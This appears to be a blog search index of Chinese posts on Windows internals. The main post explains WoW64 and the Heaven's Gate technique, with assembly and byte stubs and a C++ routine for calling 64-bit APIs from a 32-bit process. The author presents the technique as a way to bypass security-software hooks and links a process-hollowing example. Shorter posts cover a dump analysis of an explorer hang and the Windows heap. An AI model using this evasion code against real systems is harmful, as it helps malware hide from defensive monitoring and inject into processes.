[{"categories":[],"content":"\rIntroduction天堂之门 (Heaven’s Gate) 是一种专属于 Windows 操作系统的技术，其独特之处在于主要依赖于 Windows 上的 WoW64 子系统。其核心功能包括在运行于 x64 系统下的 x86（WoW64）进程中直接执行 64 位代码，以及直接调用 64 位 Windows API 函数。 从正面角度来看，天堂之门可被视为一项软件保护技术。该技术的应用导致无法直接利用 IDA 等工具进行逆向分析，同时也支持跨位数的进程注入和 Hook 操作。然而，从恶意使用的角度考虑，这项技术也具有潜在风险，因为它能够隐藏对 Windows API 的调用，从而绕过一些应用层的检测机制。 ","date":"2023-11-26","objectID":"/2023/11/heavens-gate/:1:0","series":[],"tags":[],"title":"Heaven’s Gate","uri":"/2023/11/heavens-gate/#introduction"},{"categories":[],"content":"\rWoW64 Exploration","date":"2023-11-26","objectID":"/2023/11/heavens-gate/:2:0","series":[],"tags":[],"title":"Heaven’s Gate","uri":"/2023/11/heavens-gate/#wow64-exploration"},{"categories":[],"content":"\rWoW64WoW64（Windows 32-bit on Windows 64-bit）是 Windows 中的一个子系统，其保证了在 x64 系统上运行 x86 程序的兼容性需求。 根据微软提供的 WOW64 Implementation Details，WoW64 子系统主要有以下 3 部分组成 (主要讨论 x64 系统)： Wow64.dll: Nt* 系统调用的翻译 (ntoskrnl.exe/ntdll.dll) Wow64Win.dll: 为 NtGdi*、NtUser* 和其他 GUI 相关系统调用的翻译 (win32k.sys/win32u.dll) Wow64Cpu.dll: 支持在 x64 上运行 x86 程序 除了 Nt* 系统调用转换之外， wow64.dll 还提供核心仿真基础设施。 ","date":"2023-11-26","objectID":"/2023/11/heavens-gate/:2:1","series":[],"tags":[],"title":"Heaven’s Gate","uri":"/2023/11/heavens-gate/#wow64"},{"categories":[],"content":"\rAPI Calling Process下图展示了 x64 Windows API 的调用流程。可以观察到，它简单地将 NtOpenFile 的 Service Index 放入 eax 寄存器中，通过 KUSER_SHARED_DATA 中的 SystemCall 判断使用何种系统中断方式，然后触发系统中断进入内核。 text 0:007\u003e dt _KUSER_SHARED_DATA SystemCall 7FFE0000 combase!_KUSER_SHARED_DATA +0x308 SystemCall : 0\r在 WOW64 进程中，对于 NtOpenFile 的调用过程也类似。首先，同样将 Service Index 放入 eax 寄存器中，之后调用 ntdll!Wow64SystemServiceCall 函数。 ntdll!Wow64SystemServiceCall 函数实际上只是通过一条 jmp 指令跳转到 wow64cpu！Wow64Transition 函数。 下面是实际的 wow64cpu！Wow64Transition 函数的内容。关于为什么不使用 Windbg 的截图，是因为由于 CPU 的模式在这几条指令中会发生改变，导致无法正常解析出完全正确的汇编代码。 jmp 33:wow64cpu+6009 这句汇编使用的是 opcode 为 EA 的 far jmp，与我们通常见到的基于偏移的 jmp 指令（E9）有些不同。这个指令是一种长跳转，EA 后面跟随的第一个操作数是绝对地址。成功执行后，段寄存器 cs 将被写入第二个操作数，在这个例子中为 0x33。 cs 的不同值会影响 Intel 使用不同指令集进行解析： 0x23 - 当前状态是 WOW64 架构中的 32 位 Thread 模式 0x33 - 当前状态是原生 64 位 Thread 状态（运行在原生 64 位系统中） 0x1B - 当前状态是原生 32 位 Thread 状态（运行在原生 32 位系统中） 随后，CPU 识别到 cs 为 0x33，之后的代码都会以 x64 的模式运行，因此才会出现 r15 寄存器和 qword 的关键字。 ","date":"2023-11-26","objectID":"/2023/11/heavens-gate/:2:2","series":[],"tags":[],"title":"Heaven’s Gate","uri":"/2023/11/heavens-gate/#api-calling-process"},{"categories":[],"content":"\rRunSimulatedCode为了理解遇到的第一条 x64 指令中 r15 具体是什么，我们需要理解 WoW64 子系统是如何初始化自身的。具体的细节可以参考 WoW64 internals - mindless-area。WoW64 进程其实也是运行在一个 x64 进程下，初始化进程后通过执行 BTCpuSimulate 模拟 x86 模式，执行 x86 的代码。 而 BTCpuSimulate 实际上是一个大的 while 循环，循环执行 x86 代码，当需要调用 API 函数 (系统中断) 时，由于系统只支持 x64 的函数，就需要切换回 x64 模式并再执行后返回。从 IDA 和 XP leak code 我们都可以清楚的看出这个逻辑。 下面是 BTCpuSimulate 中 RunSimulatedCode 函数入口点的代码片段，执行的重点操作如下： 通过 gs:30 将当前进程的 64 位 TEB 结构保存在 r12 寄存器中 将 wow64cpu.dll 上的一个函数列表 TurboThunkDispatch 保存在 r15 中 从 TEB+1488h 中提取出来 x86 Thread Context 结构，并将其保存在 r13 中，这个结构是为了保存 x86 线程的状态 分析到现在我们就得到了上面关注的 r15 寄存器的值。 分析 TurboThunkDispatch 列表，只有两个函数需要注意: CpupReturnFromSimulatedCode 是 32 位程序切换回 64 位环境的第一个 64 位入口函数。当 32 位程序执行需要进行系统中断的 32 位系统函数时，它会进入 wow64cpu.dll 导出的这个函数。在这个函数中，当前 32 位线程的状态被备份，并跳转到 TurboDispatchJumpAddressEnd，以便模拟当前接收到的系统中断，并执行 64 位 ntdll 函数。 TurboDispatchJumpAddressEnd 的作用是调用 wow64.dll 导出的翻译机函数 Wow64SystemServiceEx，以完成对系统中断的仿真。在仿真完成后，它会从之前备份的线程状态中进行恢复，并跳回到上一次 32 位程序的返回地址，继续程序的正常执行。 指令 jmp [r15 + 0xF8] 相当于 C 代码 jmp TurboThunkDispatch[0xF8 / sizeof(uint64_t)]。查看此索引处的函数指针，我们可以看到我们位于函数 wow64cpu!CpupReturnFromSimulatedCode。 ","date":"2023-11-26","objectID":"/2023/11/heavens-gate/:2:3","series":[],"tags":[],"title":"Heaven’s Gate","uri":"/2023/11/heavens-gate/#runsimulatedcode"},{"categories":[],"content":"\rCpupReturnFromSimulatedCode显而易见的，在整个 WoW64 进程的执行过程中，一个线程至少会涉及到两个堆栈： 32 位堆栈: 用于保存 32 位参数，主要用于 32 位程序的 push/pop/call/ret 等操作。 64 位堆栈: 另一个堆栈仅在 WOW64 翻译阶段使用，仅在线程切回 64 位时才会涉及。将这两个堆栈分开有许多好处，例如避免相互污染，防止参数内文或内存分配/释放大小的错误导致程序直接崩溃。 下图中的 xchg rsp, r14 将当前使用的 32 位堆栈从寄存器 esp 切换到寄存器 r14，将 64 位堆栈从 r14 取回并放入 rsp 中，作为当前的主要堆栈，完成了两个堆栈之间的无污染切换。 r14 中现在保存的是 32 位堆栈。因此，mov r8d, [r14] 取得 32 位应返回的地址 (call 时 push 的 eip)，接着将此地址保存到 r13 所指向的 Thread 快照纪录的 CONTEXT.EIP 中，以便后续跳回 32 位原始程序并继续执行。同理，r11 从 r14+4 处获取地址，即 32 位堆栈上保存当前系统函数参数的地址 (push a1 ,push a2 …)。 接下来，将 32 位运行所必需的几个关键参数（如可能受到文本操作系列指令影响的寄存器 edi、esi，与栈帧相关的 ebp，运算旗标记录 r8d 等）一并写入 r13 指向的 Thread 快照纪录。这样就完成了对 32 位状态的快照备份，可以安心跳转到 TurboDispatchJumpAddressStart 函数中进行下一步操作。 而 TurboDispatchJumpAddressStart 只是针对不同的 API 进行分发而已。eax 中保存的是 API 的 Service Index，计算方式是将 index 右移 16 位。所以其实 API 的 index 中高两位就是其在 TurboThunkDispatch 中的索引，而大部分的 API 的高两位都是 0，所以大部分都会执行 TurboDispatchJumpAddressEnd. ","date":"2023-11-26","objectID":"/2023/11/heavens-gate/:2:4","series":[],"tags":[],"title":"Heaven’s Gate","uri":"/2023/11/heavens-gate/#cpupreturnfromsimulatedcode"},{"categories":[],"content":"\rTurboDispatchJumpAddressEndTurboDispatchJumpAddressEnd 调用 Wow64SystemServiceEx,一次传入 API 的 index 和参数，调用完成后将结果保存在 r13 的 context 中。 之后便是复原刚才保存的各个寄存器的内容，最后通过 jmp far 切换回 x86 模式并继续执行。 ","date":"2023-11-26","objectID":"/2023/11/heavens-gate/:2:5","series":[],"tags":[],"title":"Heaven’s Gate","uri":"/2023/11/heavens-gate/#turbodispatchjumpaddressend"},{"categories":[],"content":"\rWow64SystemServiceEx上面说过，该函数的第一参数是 API 的 index，而这个 index 其实是一个 WOW64_SYSTEM_SERVICE 结构，其大小为 16 位。其中低 12 位表示函数识别码，而较高的 4 位表示系统函数表的辨识码。 这是个二维数组，其位于 wow64.dll 中，其中保存的是 wh 开头的 Nt 函数。执行 Nt 函数时，会调用对应的 whNt 函数，由其来调用对应的 64 位 Nt 函数。 而 Wow64SystemServiceEx 的作用就是利用传入的 API index 进行分发。 以上，便是对于 WoW64 实现原理的分析，之后我们来进入关于 Heaven’s Gate 的分析。 ","date":"2023-11-26","objectID":"/2023/11/heavens-gate/:2:6","series":[],"tags":[],"title":"Heaven’s Gate","uri":"/2023/11/heavens-gate/#wow64systemserviceex"},{"categories":[],"content":"\rHeaven’s Gate Exploration现在我们已经清楚了 WoW64 进程的工作流程。在正常情况下，其调用应如下图一样。 而某些安全软件的主动防御等监控功能会 Hook 掉一些恶意软件常用的 API 函数。Hook 后的流程如下图一样。而天堂之门技术的核心就是绕过 WoW64 子系统，直接在 WoW64 进程内调用 API 函数，这样就可以 ByPass 掉一些安全软件的防护措施。 而 WoW64 进程中直接调用 x64 的 API 函数也存在两种不同的方式： 搜索目标 API 函数地址，构造参数，直接调用 搜索 Wow64SystemServiceEx 函数的地址，通过其进行调用 显然，第二种方法是通过 WoW64 子系统进行的调用，鉴于其为 Windows 自身的子系统，可以确保调用的兼容性，所以本文采用第二种方法实现。 ","date":"2023-11-26","objectID":"/2023/11/heavens-gate/:3:0","series":[],"tags":[],"title":"Heaven’s Gate","uri":"/2023/11/heavens-gate/#heavens-gate-exploration"},{"categories":[],"content":"\rHeaven’s Gate Implementation天堂之门技术需要一些操作来绕过 WoW64 机制，手动切换到 64 位模式并调用 64 位下的 API 函数，大致流程如下 (参考)： 通过设置 cs 标志切换到 64 位 CPU 模式 通过 (GS:0x30)-\u003ePEB 获取 PEB64 通过 PEB-\u003eLdr 枚举加载的 64 位模块 找到 WoW64.dll 的 imageBase 获取导出的 API wow64!Wow64SystemServiceEx 传递 32 位 va_start 并执行它以将我们的 32 位模拟为 64 位中断 ","date":"2023-11-26","objectID":"/2023/11/heavens-gate/:3:1","series":[],"tags":[],"title":"Heaven’s Gate","uri":"/2023/11/heavens-gate/#heavens-gate-implementation"},{"categories":[],"content":"\rRead x64 memmory in WoW64 process上述流程中存在一个需要注意的问题，我们需要获取的 wow64.dll 的 imageBase 并在其中搜索导出函数 Wow64SystemServiceEx,但这个模块本身是 64 位的版本，其中的地址也是 64 位地址。而 32 位进程正常情况下，由于地址空间的问题，是无法读取 64 位进程的内存的。解决这个问题的办法就是将进程切换到 64 位模式，将内存复制到 32 位进程中，再正常进行读取。 switch to 64 bits\rasm push 0x33 // 0x6A,0x33 call $+5 // 0xe8,0x00,0x00,0x00 add DWORD PTR [esp],0x5 // 0x83,0x04,0x24,0x05 retf // 0xcb // x64 code\rpush 0x33，将要赋给 cs 寄存器的值压入栈 通过 call 将下一条语句的地址压入栈 将上条语句压入的地址加 5 (当前语句和下条语句的长度，修改后指向 x64 code) retf 会将 cs 设置为 0x33(x64 模式)，并返回到栈中保存的地址 memcpy64\rasm mov rdi,QWORD PTR [esp+0x4] \"\\x67\\x48\\x8b\\x7c\\x24\\x04\" mov rsi,QWORD PTR [esp+0xc] \"\\x67\\x48\\x8b\\x74\\x24\\x0c\" mov rcx,QWORD PTR [esp+0x14] \"\\x67\\x48\\x8b\\x4c\\x24\\x14\" rep movs BYTE PTR es:[rdi],BYTE PTR ds:[rsi] \"\\xf3\\xa4\" 通过 rep movs 命令实现 memcpy switch to 32 bits\rasm call $+5 \"\\xe8\\x00\\x00\\x00\\x00\" mov DWORD PTR [rsp+0x4],0x23 \"\\xc7\\x44\\x24\\x04\\x23\\x00\\x00\\x00\" add DWORD PTR [rsp],0xd \"\\x83\\x04\\x24\\x0d\" retf \"\\xcb\" // x64 code\r通过 call 将下一条语句的地址压入栈 将要赋给 cs 寄存器的值放入栈 将 call 压入的地址加 d (当前语句和下条语句的长度，修改后指向 x64 code) retf 会将 cs 设置为 0x23(x86 模式)，并返回到栈中保存的地址 ","date":"2023-11-26","objectID":"/2023/11/heavens-gate/:3:2","series":[],"tags":[],"title":"Heaven’s Gate","uri":"/2023/11/heavens-gate/#read-x64-memmory-in-wow64-process"},{"categories":[],"content":"\rRead x64 memmory in WoW64 process上述流程中存在一个需要注意的问题，我们需要获取的 wow64.dll 的 imageBase 并在其中搜索导出函数 Wow64SystemServiceEx,但这个模块本身是 64 位的版本，其中的地址也是 64 位地址。而 32 位进程正常情况下，由于地址空间的问题，是无法读取 64 位进程的内存的。解决这个问题的办法就是将进程切换到 64 位模式，将内存复制到 32 位进程中，再正常进行读取。 switch to 64 bits\rasm push 0x33 // 0x6A,0x33 call $+5 // 0xe8,0x00,0x00,0x00 add DWORD PTR [esp],0x5 // 0x83,0x04,0x24,0x05 retf // 0xcb // x64 code\rpush 0x33，将要赋给 cs 寄存器的值压入栈 通过 call 将下一条语句的地址压入栈 将上条语句压入的地址加 5 (当前语句和下条语句的长度，修改后指向 x64 code) retf 会将 cs 设置为 0x33(x64 模式)，并返回到栈中保存的地址 memcpy64\rasm mov rdi,QWORD PTR [esp+0x4] \"\\x67\\x48\\x8b\\x7c\\x24\\x04\" mov rsi,QWORD PTR [esp+0xc] \"\\x67\\x48\\x8b\\x74\\x24\\x0c\" mov rcx,QWORD PTR [esp+0x14] \"\\x67\\x48\\x8b\\x4c\\x24\\x14\" rep movs BYTE PTR es:[rdi],BYTE PTR ds:[rsi] \"\\xf3\\xa4\" 通过 rep movs 命令实现 memcpy switch to 32 bits\rasm call $+5 \"\\xe8\\x00\\x00\\x00\\x00\" mov DWORD PTR [rsp+0x4],0x23 \"\\xc7\\x44\\x24\\x04\\x23\\x00\\x00\\x00\" add DWORD PTR [rsp],0xd \"\\x83\\x04\\x24\\x0d\" retf \"\\xcb\" // x64 code\r通过 call 将下一条语句的地址压入栈 将要赋给 cs 寄存器的值放入栈 将 call 压入的地址加 d (当前语句和下条语句的长度，修改后指向 x64 code) retf 会将 cs 设置为 0x23(x86 模式)，并返回到栈中保存的地址 ","date":"2023-11-26","objectID":"/2023/11/heavens-gate/:3:2","series":[],"tags":[],"title":"Heaven’s Gate","uri":"/2023/11/heavens-gate/#switch-to-64-bits"},{"categories":[],"content":"\rRead x64 memmory in WoW64 process上述流程中存在一个需要注意的问题，我们需要获取的 wow64.dll 的 imageBase 并在其中搜索导出函数 Wow64SystemServiceEx,但这个模块本身是 64 位的版本，其中的地址也是 64 位地址。而 32 位进程正常情况下，由于地址空间的问题，是无法读取 64 位进程的内存的。解决这个问题的办法就是将进程切换到 64 位模式，将内存复制到 32 位进程中，再正常进行读取。 switch to 64 bits\rasm push 0x33 // 0x6A,0x33 call $+5 // 0xe8,0x00,0x00,0x00 add DWORD PTR [esp],0x5 // 0x83,0x04,0x24,0x05 retf // 0xcb // x64 code\rpush 0x33，将要赋给 cs 寄存器的值压入栈 通过 call 将下一条语句的地址压入栈 将上条语句压入的地址加 5 (当前语句和下条语句的长度，修改后指向 x64 code) retf 会将 cs 设置为 0x33(x64 模式)，并返回到栈中保存的地址 memcpy64\rasm mov rdi,QWORD PTR [esp+0x4] \"\\x67\\x48\\x8b\\x7c\\x24\\x04\" mov rsi,QWORD PTR [esp+0xc] \"\\x67\\x48\\x8b\\x74\\x24\\x0c\" mov rcx,QWORD PTR [esp+0x14] \"\\x67\\x48\\x8b\\x4c\\x24\\x14\" rep movs BYTE PTR es:[rdi],BYTE PTR ds:[rsi] \"\\xf3\\xa4\" 通过 rep movs 命令实现 memcpy switch to 32 bits\rasm call $+5 \"\\xe8\\x00\\x00\\x00\\x00\" mov DWORD PTR [rsp+0x4],0x23 \"\\xc7\\x44\\x24\\x04\\x23\\x00\\x00\\x00\" add DWORD PTR [rsp],0xd \"\\x83\\x04\\x24\\x0d\" retf \"\\xcb\" // x64 code\r通过 call 将下一条语句的地址压入栈 将要赋给 cs 寄存器的值放入栈 将 call 压入的地址加 d (当前语句和下条语句的长度，修改后指向 x64 code) retf 会将 cs 设置为 0x23(x86 模式)，并返回到栈中保存的地址 ","date":"2023-11-26","objectID":"/2023/11/heavens-gate/:3:2","series":[],"tags":[],"title":"Heaven’s Gate","uri":"/2023/11/heavens-gate/#memcpy64"},{"categories":[],"content":"\rRead x64 memmory in WoW64 process上述流程中存在一个需要注意的问题，我们需要获取的 wow64.dll 的 imageBase 并在其中搜索导出函数 Wow64SystemServiceEx,但这个模块本身是 64 位的版本，其中的地址也是 64 位地址。而 32 位进程正常情况下，由于地址空间的问题，是无法读取 64 位进程的内存的。解决这个问题的办法就是将进程切换到 64 位模式，将内存复制到 32 位进程中，再正常进行读取。 switch to 64 bits\rasm push 0x33 // 0x6A,0x33 call $+5 // 0xe8,0x00,0x00,0x00 add DWORD PTR [esp],0x5 // 0x83,0x04,0x24,0x05 retf // 0xcb // x64 code\rpush 0x33，将要赋给 cs 寄存器的值压入栈 通过 call 将下一条语句的地址压入栈 将上条语句压入的地址加 5 (当前语句和下条语句的长度，修改后指向 x64 code) retf 会将 cs 设置为 0x33(x64 模式)，并返回到栈中保存的地址 memcpy64\rasm mov rdi,QWORD PTR [esp+0x4] \"\\x67\\x48\\x8b\\x7c\\x24\\x04\" mov rsi,QWORD PTR [esp+0xc] \"\\x67\\x48\\x8b\\x74\\x24\\x0c\" mov rcx,QWORD PTR [esp+0x14] \"\\x67\\x48\\x8b\\x4c\\x24\\x14\" rep movs BYTE PTR es:[rdi],BYTE PTR ds:[rsi] \"\\xf3\\xa4\" 通过 rep movs 命令实现 memcpy switch to 32 bits\rasm call $+5 \"\\xe8\\x00\\x00\\x00\\x00\" mov DWORD PTR [rsp+0x4],0x23 \"\\xc7\\x44\\x24\\x04\\x23\\x00\\x00\\x00\" add DWORD PTR [rsp],0xd \"\\x83\\x04\\x24\\x0d\" retf \"\\xcb\" // x64 code\r通过 call 将下一条语句的地址压入栈 将要赋给 cs 寄存器的值放入栈 将 call 压入的地址加 d (当前语句和下条语句的长度，修改后指向 x64 code) retf 会将 cs 设置为 0x23(x86 模式)，并返回到栈中保存的地址 ","date":"2023-11-26","objectID":"/2023/11/heavens-gate/:3:2","series":[],"tags":[],"title":"Heaven’s Gate","uri":"/2023/11/heavens-gate/#switch-to-32-bits"},{"categories":[],"content":"\rCall x64 API in x86 Process 通过 memcpy64 读取 64 位内存，并获取 API 地址 通过 memcpy64 读取 64 位内存，并获取 Wow64SystemServiceEx 地址 调用 API 函数时，将 API 地址写入 eax，将 translator 的地址写入 0xdeadbeef 所在位置 实现通过 translator 调用 x64 函数 cpp int X64Call(const char* NtApiName, ...) { PCHAR jit_stub; PCHAR api_addr = PCHAR(GetApiAddress(NtApiName)); static uint64_t translator(0); if (!translator) GetWow64SystemServiceEx(translator); static uint8_t stub_template[] = { /* overwirte by API address*/ 0xB8, 0x00, 0x00, 0x00, 0x00, /* mov eax,0x0 */ 0x8b, 0x54, 0x24, 0x04, /* mov edx,DWORD PTR [esp+0x4] */ 0x89, 0xC1, /* mov ecx,eax */ /* enter 64 bit mode */ 0x6A, 0x33, /* push 0x33 */ 0xE8, 0x00, 0x00, 0x00, 0x00, /* call $+5 */ 0x83, 0x04, 0x24, 0x05, /* add DWORD PTR [esp],0x5 */ 0xCB, /* retf */ /* call API*/ 0x49, 0x87, 0xE6, /* xchg r14,rsp */ 0xFF, 0x14, 0x25, 0xEF, 0xBE, 0xAD, 0xDE, /* call QWORD PTR ds:0xdeadbeef */ 0x49, 0x87, 0xE6, /* xchg r14,rsp */ /* exit 64 bit mode */ 0xE8, 0x00, 0x00, 0x00, 0x00, /* call $+5 */ 0xC7, 0x44, 0x24, 0x04, 0x23, 0x00, 0x00, 0x00, /* mov DWORD PTR [rsp+0x4],0x23 */ 0x83, 0x04, 0x24, 0x0D, /* add DWORD PTR [rsp],0xd */ 0xCB, /* retf */ 0xc3, /* ret */ }; jit_stub = (PCHAR)VirtualAlloc(0, sizeof(stub_template), MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(jit_stub, stub_template, sizeof(stub_template)); va_list args; va_start(args, NtApiName); *((uint32_t*)\u0026jit_stub[0x01]) = *(uint32_t*)\u0026api_addr[1]; *((uint32_t*)\u0026jit_stub[0x1d]) = (size_t)\u0026translator; auto ret = ((NTSTATUS(__cdecl*)(...))jit_stub)(args); return ret; }\r","date":"2023-11-26","objectID":"/2023/11/heavens-gate/:3:3","series":[],"tags":[],"title":"Heaven’s Gate","uri":"/2023/11/heavens-gate/#call-x64-api-in-x86-process"},{"categories":[],"content":"\rexample参考 aaaddress1 的实现，通过 Heaven’s Gate 技术，利用 Process Hollowing 技术，实现了进程注入。 完整代码见 GitHub 仓库：dre4merp/HeavenGate ","date":"2023-11-26","objectID":"/2023/11/heavens-gate/:3:4","series":[],"tags":[],"title":"Heaven’s Gate","uri":"/2023/11/heavens-gate/#example"},{"categories":[],"content":"\r参考 WoW64 internals - mindless-area Mixing x86 with x64 code – ReWolf’s blog Knockin’ on Heaven’s Gate – Dynamic Processor Mode Switching | RCE.co WoW64!Hooks: WoW64 Subsystem Internals and Hooking Techniques | Mandiant 重建天堂之門：從 32 位元地獄一路打回天堂聖地（上）深度逆向工程 WoW64 設計 重建天堂之門：從 32 位元地獄一路打回天堂聖地（下）攻擊篇：x96 Shellcode、天堂聖杯 ＆ 天堂注入器 ","date":"2023-11-26","objectID":"/2023/11/heavens-gate/:4:0","series":[],"tags":[],"title":"Heaven’s Gate","uri":"/2023/11/heavens-gate/#参考"},{"categories":[],"content":"\r背景最近在工作中遇到了个桌面卡死问题，需要分析 dump 查找问题原因。第一次分析 dump 查找卡死问题，特此记录下。 ","date":"2023-11-14","objectID":"/2023/11/explorer_dump_analysis/:1:0","series":[],"tags":[],"title":"Explorer_dump_analysis","uri":"/2023/11/explorer_dump_analysis/#背景"},{"categories":[],"content":"\r流程","date":"2023-11-14","objectID":"/2023/11/explorer_dump_analysis/:2:0","series":[],"tags":[],"title":"Explorer_dump_analysis","uri":"/2023/11/explorer_dump_analysis/#流程"},{"categories":[],"content":"\r查看 explorer因为卡死的外在表现就是桌面进程卡死了，所以入手点就选在 explorer 进程中。 !process 0 0 explorer.exe 发现系统存在两个 explorer.exe，其中 07ac 的 HandleCount 更多一些，明显是实际工作的进程 .process /p /r ffffcf0f746ac080 !process ffffcf0f746ac080 7 查看下所有的线程和对应的堆栈信息，需要重点关注 堆栈长度，卡死的线程的堆栈都会比较深 Ticks 表示等待的时间，卡死的线程等待时间会比较长 WAIT 卡死问题很多都是 rpc/alpc 引起的，需要关注相关的等待类型 如果直接有 Waiting for reply ，这个线程也需要关注 通过上述这些特征，找到了下面这个线程 !thread ffffcf0f70d8d080 windbg 有针对 rpc/alpc 的扩展，可以直接查看 rpc 消息并定位到对应的 ServerThread ","date":"2023-11-14","objectID":"/2023/11/explorer_dump_analysis/:2:1","series":[],"tags":[],"title":"Explorer_dump_analysis","uri":"/2023/11/explorer_dump_analysis/#查看-explorer"},{"categories":[],"content":"\r分析 COM 服务进程如上图，可以清晰的看到当前 rpc 请求的服务进程是 sihost.exe，服务线程是 ffffcf0f71a6a2c0，点进去看一下 .process /p /r ffffcf0f71a72440 .thread ffffcf0f71a6a2c0 !thread ffffcf0f`71a6a2c0 通过 KeWaitForMultipleObjects 的第一参数和第二参数可以看出其正在等待两个事件。 等待事件的原因是在发起 COM 请求，所以我们需要找到其对应的服务进程和线程来确定为什么 COM 请求被卡住了 查看 COM 请求的发起函数 combase!ThreadSendReceive 发现符号非常全，甚至包括其参数的类符号，看一下参数中是否有对应的 server 相关信息 发现存在 pid 和 tid，那么就可以通过这两个成员获取服务进程。接下来就是找到这个参数在内存中保存的位置。因为目标机器是 x64 的，这个进程也是 x64 的进程，调用约定是 fastcall，参数的传递用的是寄存器。那么就需要查看对应代码，找到参数 rcx、rdx 在被赋值时被 push 保存到栈上的位置。 通过查看 combase!ThreadSendReceive 被调用时的参数赋值，可以看出目标第二参数 rdx，在赋值给 rdx 之前是由 rdi 进行保存的。而 rdi 寄存器在会被其在初始化函数时保存在栈上，由此可以找到第二参数 下图是 combase!ThreadSendReceive 的栈顶位置 (rsp) 回溯堆栈就需要将函数初始化时的操作进行逆置，也就是 000000ac`4cffa720 + 5b0 + 4 * 8 asm push rbp push rsi push rdi push r12 push r13 push r14 push r15 lea rbp, [rsp-4B0h]\r至此，我们找到了 COM 的服务进程，需要继续切换进 468 进程中查看问题 ","date":"2023-11-14","objectID":"/2023/11/explorer_dump_analysis/:2:2","series":[],"tags":[],"title":"Explorer_dump_analysis","uri":"/2023/11/explorer_dump_analysis/#分析-com-服务进程"},{"categories":[],"content":"\r分析 RPC 消息 发现了两个正在等待 alpc reply 的线程，且 port 都属于 ffffcf0f7000d540 进程，可见是该进程内出现了卡死。重复上面 alpc 相关的分析过程，查看 message 和 ServerThread 另一个线程是相同的堆栈，可以看出是 360FsFlt 驱动向应用层发消息时卡住了，终于就要找到问题了。接下来就是要找到这个 Filter 对应的应用层进程了。 0: kd\u003e x FLTMGR!FltSendMessage fffff80d`9032b610 FLTMGR!FltSendMessage (void) 根据堆栈可以看出是 360FsFlt 这个驱动对创建进程进行了监控，在创建新进程时会向应用层发消息。 ","date":"2023-11-14","objectID":"/2023/11/explorer_dump_analysis/:2:3","series":[],"tags":[],"title":"Explorer_dump_analysis","uri":"/2023/11/explorer_dump_analysis/#分析-rpc-消息"},{"categories":[],"content":"\r结果至于具体是哪个应用层进程，其实大概可以猜出来。首先肯定是 360 的进程，最大概率就是 360Tray.exe ZhuDongFangYu.exe 360EDRSensor.exe 这些。经过分析，这个应用层进程是 360EDRSensor.exe. 目前还没有找到如何直接找到 FltSendMessage 应用层进程的方法，尝试通过 !fltkd.fliter ffffcf0f68774010 获取相关信息，但是没有找到可行的方法。之后再遇到看看有没有其他方法吧 至于最后应用层到底是因为什么卡死，就交给对应的同事去分析了，没有符号很难看出具体原因 ","date":"2023-11-14","objectID":"/2023/11/explorer_dump_analysis/:3:0","series":[],"tags":[],"title":"Explorer_dump_analysis","uri":"/2023/11/explorer_dump_analysis/#结果"},{"categories":[],"content":"\r理解堆栈是分配局部变量和储存函数调用参数及返回地址的主要场所，栈空间是在程序设计时已经规定好怎么使用，使用多少内存空间的。栈变量在使用的时候不需要额外的申请操作，系统栈会根据函数中的变量声明自动在函数栈帧中给其预留空间。栈空间由系统维护，它的分配（如 sub esp ，xx ;）和回收（如 add esp，xxx）都由系统来完成，最终达到栈平衡。所有的这些对程序员来说都是透明的。 同时栈也存在一些不足之处。 栈空间（尤其是内核态栈）的容量是相对较小的，其很难完成一些需要很大空间的操作。 栈空间会在函数返回时释放，不适合保存生命周期较长的变量和对象。 栈空间在程序编译时确定大小，无法分配运行期才能决定大小的缓冲区。 堆（Heap）克服了栈的以上局限，是程序申请和使用内存空间的另一种重要途径。应用程序通过内存分配函数（如 malloc 或 HeapAlloc）或 new 操作符获得的内存空间都来自于堆。 通过堆，内存管理器（Memory Manager）将一块较大的内存空间委托给堆管理器（Heap Manager）来管理。堆管理器将大块的内存分割成不同大小的很多个小块来满足应用程序的需要。这样的分层设计可以减轻内存管理器的负担，同时大大缩短应用程序申请内存分配所需的时间，提高程序的运行速度。 下图展示了操作系统中不同层次的内存分配方法。 ","date":"2022-06-19","objectID":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/:1:0","series":[],"tags":[],"title":"深入理解 Windows 堆管理机制","uri":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/#理解堆"},{"categories":[],"content":"\r堆和栈的区别 堆内存 栈内存 典型用例 动态增长的链表等数据结构 函数局部数组 申请方式 需要用函数申请，通过返回的指针使用 在程序中直接声明即可 释放方式 需要把指针传给专用的释放函数 函数返回时，由系统自动回收 管理方式 需要程序员处理申请与释放 申请后直接使用，申请与释放由系统自动完成，最后达到栈区平衡 所处位置 变化范围很大 增长方向 由内存低址向高址排列（不考虑碎片等情况） 由内存高址向低址增加 ","date":"2022-06-19","objectID":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/:2:0","series":[],"tags":[],"title":"深入理解 Windows 堆管理机制","uri":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/#堆和栈的区别"},{"categories":[],"content":"\r堆管理器结构每个进程通常都有很多个堆，程序可以通过自己的需要创建新的堆。它会有一个默认的进程堆，指向这个堆的指针被存放在进程环境块 PEB(Process Environment Block) 中，而这个进程的所有堆，都以链表的形式被挂在 PEB 上。 如下图所示，堆管理器被结构化为 2 层：一个可选的前端层，以及核心堆层（也叫做后端堆层）。核心堆处理基本功能，并且是最为常见跨越用户与内核模式堆的实现。其核心功能包括段内块（blocks inside segments）的管理，段的管理，扩展堆的策略，提交和回收内存，以及大型块的管理（之后会具体分析）。 ","date":"2022-06-19","objectID":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/:3:0","series":[],"tags":[],"title":"深入理解 Windows 堆管理机制","uri":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/#堆管理器结构"},{"categories":[],"content":"\r进程默认堆Windows 系统在创建一个新的进程时，在加载器函数执行新城的用户态初始化阶段，会调用RtlCreateHeap函数为进程创建第一个堆，作为进程的默认堆（Process 